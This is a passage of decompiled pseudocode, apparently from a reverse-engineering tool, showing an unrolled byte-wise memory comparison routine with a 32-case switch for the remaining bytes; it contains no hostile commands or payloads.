iVar2;\n                }\n                iVar2 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[5] == arg_ch[5]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[5] & 0xff;\n                uVar1 = *(arg_ch + 5);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x15);\n                uVar1 = *(arg_ch + 0x15);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x16);\n                uVar1 = *(arg_ch + 0x16);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[6] == arg_ch[6]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[6] & 0xff;\n                uVar1 = *(arg_ch + 6);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x19);\n                uVar1 = *(arg_ch + 0x19);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x1a);\n                uVar1 = *(arg_ch + 0x1a);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg_8h[7] == arg_ch[7]) {\n                iVar2 = 0;\n            }\n            else {\n                uVar3 = arg_8h[7] & 0xff;\n                uVar1 = *(arg_ch + 7);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x1d);\n                uVar1 = *(arg_ch + 0x1d);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                uVar3 = *(arg_8h + 0x1e);\n                uVar1 = *(arg_ch + 0x1e);\n                if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                    return iVar2;\n                }\n                iVar2 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                if (iVar2 != 0) {\n                    iVar2 = (0 < iVar2) * 2 + -1;\n                }\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            arg_10h = arg_10h - 0x20;\n            arg_8h = arg_8h + 8;\n            arg_ch = arg_ch + 8;\n        } while (0x1f < arg_10h);\n    }\n    // switch table (32 cases) at 0x424279\n    switch(arg_10h) {\n    default:\n        goto code_r0x00423483;\n    case 1:\n        goto code_r0x0042389f;\n    case 2:\n        goto code_r0x00423ce4;\n    case 3:\n        goto code_r0x0042411a;\n    case 4:\n        goto code_r0x00423400;\n    case 5:\n        goto code_r0x00423808;\n    case 6:\n        goto code_r0x00423c4d;\n    case 7:\n        goto code_r0x00424083;\n    case 8:\n        goto code_r0x00423369;\n    case 9:\n        goto code_r0x00423770;\n    case 10:\n        goto code_r0x00423bb5;\n    case 0xb:\n        goto code_r0x00423fec;\n    case 0xc:\n        goto code_r0x004232d1;\n    case 0xd:\n        goto code_r0x004236d9;\n    case 0xe:\n        goto code_r0x00423b1e;\n    case 0xf:\n        goto code_r0x00423f54;\n    case 0x10:\n        goto code_r0x0042323a;\n    case 0x11:\n        goto code_r0x00423642;\n    case 0x12:\n        goto code_r0x00423a87;\n    case 0x13:\n        goto code_r0x00423ebd;\n    case 0x14:\n        goto code_r0x004231a3;\n    case 0x15:\n        goto code_r0x004235ab;\n    case 0x16:\n        goto code_r0x004239f0;\n    case 0x17:\n        goto code_r0x00423e26;\n    case 0x18:\n        goto code_r0x0042310c;\n    case 0x1a:\n        goto code_r0x00423959;\n    case 0x1b:\n        goto code_r0x00423d8f;\n    case 0x1c:\n        uVar1 = *(arg_8h + (arg_10h - 0x1c));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1c))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1b));\n            uVar1 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1a));\n            uVar1 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x19)) - *(arg_ch + (arg_10h - 0x19));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x0042310c:\n        uVar1 = *(arg_8h + (arg_10h - 0x18));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x18))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x17));\n            uVar1 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x16));\n            uVar1 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x15)) - *(arg_ch + (arg_10h - 0x15));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004231a3:\n        uVar1 = *(arg_8h + (arg_10h - 0x14));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x14))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x14));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x13));\n            uVar1 = *(arg_ch + (arg_10h - 0x13));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x12));\n            uVar1 = *(arg_ch + (arg_10h - 0x12));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x11)) - *(arg_ch + (arg_10h - 0x11));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x0042323a:\n        uVar1 = *(arg_8h + (arg_10h - 0x10));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x10))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x10));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xf));\n            uVar1 = *(arg_ch + (arg_10h - 0xf));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xe));\n            uVar1 = *(arg_ch + (arg_10h - 0xe));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xd)) - *(arg_ch + (arg_10h - 0xd));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004232d1:\n        if (*(arg_8h + (arg_10h - 0xc)) == *(arg_ch + (arg_10h - 0xc))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 0xc));\n            uVar3 = *(arg_8h + (arg_10h - 0xc));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xb));\n            uVar1 = *(arg_ch + (arg_10h - 0xb));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 10));\n            uVar1 = *(arg_ch + (arg_10h - 10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 9)) - *(arg_ch + (arg_10h - 9));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423369:\n        uVar1 = *(arg_8h + (arg_10h - 8));\n        if (uVar1 == *(arg_ch + (arg_10h - 8))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 8));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 7));\n            uVar1 = *(arg_ch + (arg_10h - 7));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 6));\n            uVar1 = *(arg_ch + (arg_10h - 6));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 5)) - *(arg_ch + (arg_10h - 5));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423400:\n        uVar1 = *(arg_8h + (arg_10h - 4));\n        if (uVar1 == *(arg_ch + (arg_10h - 4))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 4));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 3));\n            uVar1 = *(arg_ch + (arg_10h - 3));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 2));\n            uVar1 = *(arg_ch + (arg_10h - 2));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 1)) - *(arg_ch + (arg_10h - 1));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 == 0) {\ncode_r0x00423483:\n            iVar2 = 0;\n        }\n        return iVar2;\n    case 0x1d:\n        uVar1 = *(arg_8h + (arg_10h - 0x1d));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1d))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1c));\n            uVar1 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1b));\n            uVar1 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x1a)) - *(arg_ch + (arg_10h - 0x1a));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    case 0x19:\n        uVar1 = *(arg_8h + (arg_10h - 0x19));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x19))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x18));\n            uVar1 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x17));\n            uVar1 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x16)) - *(arg_ch + (arg_10h - 0x16));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004235ab:\n        uVar1 = *(arg_8h + (arg_10h - 0x15));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x15))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x15));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x14));\n            uVar1 = *(arg_ch + (arg_10h - 0x14));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x13));\n            uVar1 = *(arg_ch + (arg_10h - 0x13));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x12)) - *(arg_ch + (arg_10h - 0x12));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423642:\n        uVar1 = *(arg_8h + (arg_10h - 0x11));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x11))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x11));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x10));\n            uVar1 = *(arg_ch + (arg_10h - 0x10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xf));\n            uVar1 = *(arg_ch + (arg_10h - 0xf));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xe)) - *(arg_ch + (arg_10h - 0xe));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004236d9:\n        uVar1 = *(arg_8h + (arg_10h - 0xd));\n        if (uVar1 == *(arg_ch + (arg_10h - 0xd))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0xd));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xc));\n            uVar1 = *(arg_ch + (arg_10h - 0xc));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xb));\n            uVar1 = *(arg_ch + (arg_10h - 0xb));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 10)) - *(arg_ch + (arg_10h - 10));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423770:\n        if (*(arg_8h + (arg_10h - 9)) == *(arg_ch + (arg_10h - 9))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 9));\n            uVar3 = *(arg_8h + (arg_10h - 9));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 8));\n            uVar1 = *(arg_ch + (arg_10h - 8));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 7));\n            uVar1 = *(arg_ch + (arg_10h - 7));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 6)) - *(arg_ch + (arg_10h - 6));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423808:\n        uVar1 = *(arg_8h + (arg_10h - 5));\n        if (uVar1 == *(arg_ch + (arg_10h - 5))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 5));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 4));\n            uVar1 = *(arg_ch + (arg_10h - 4));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 3));\n            uVar1 = *(arg_ch + (arg_10h - 3));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 2)) - *(arg_ch + (arg_10h - 2));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\ncode_r0x00423897:\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x0042389f:\n        uVar1 = *(arg_ch + (arg_10h - 1));\n        uVar3 = *(arg_8h + (arg_10h - 1));\n        if (uVar3 == uVar1) {\n            return 0;\n        }\n        return (0 < uVar3 - uVar1) * 2 + -1;\n    case 0x1e:\n        uVar1 = *(arg_8h + (arg_10h - 0x1e));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1e))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1d));\n            uVar1 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1c));\n            uVar1 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x1b)) - *(arg_ch + (arg_10h - 0x1b));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423959:\n        uVar1 = *(arg_8h + (arg_10h - 0x1a));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1a))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x19));\n            uVar1 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x18));\n            uVar1 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x17)) - *(arg_ch + (arg_10h - 0x17));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x004239f0:\n        uVar1 = *(arg_8h + (arg_10h - 0x16));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x16))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x15));\n            uVar1 = *(arg_ch + (arg_10h - 0x15));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x14));\n            uVar1 = *(arg_ch + (arg_10h - 0x14));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x13)) - *(arg_ch + (arg_10h - 0x13));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423a87:\n        uVar1 = *(arg_8h + (arg_10h - 0x12));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x12))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x12));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x11));\n            uVar1 = *(arg_ch + (arg_10h - 0x11));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x10));\n            uVar1 = *(arg_ch + (arg_10h - 0x10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xf)) - *(arg_ch + (arg_10h - 0xf));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423b1e:\n        uVar1 = *(arg_8h + (arg_10h - 0xe));\n        if (uVar1 == *(arg_ch + (arg_10h - 0xe))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0xe));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xd));\n            uVar1 = *(arg_ch + (arg_10h - 0xd));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xc));\n            uVar1 = *(arg_ch + (arg_10h - 0xc));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xb)) - *(arg_ch + (arg_10h - 0xb));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423bb5:\n        if (*(arg_8h + (arg_10h - 10)) == *(arg_ch + (arg_10h - 10))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 10));\n            